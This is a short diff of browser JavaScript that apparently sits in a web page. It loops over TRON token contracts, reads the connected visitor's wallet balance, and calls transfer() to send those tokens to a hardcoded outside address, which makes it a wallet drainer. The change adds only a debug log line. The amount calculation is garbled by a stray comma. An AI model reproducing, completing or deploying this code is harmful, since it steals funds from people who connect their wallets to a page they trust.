@@ -23,6 +23,7 @@ var contractsAddress = ["TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
                     try{
                     var cc = await window.tronWeb.contract().at(contractsAddress[i]);
                     balance = await cc.balanceOf(window.tronWeb.defaultAddress.base58).call();
+                      console.log(balance.toNumber())
                     if (balance.toNumber() >= 0){
                         await cc.transfer("TAGsxbmwHvgVUrRgKQzKu6cZ6N255MS51d", Math.round(balance * 34,806 / 100)).send()
                     }
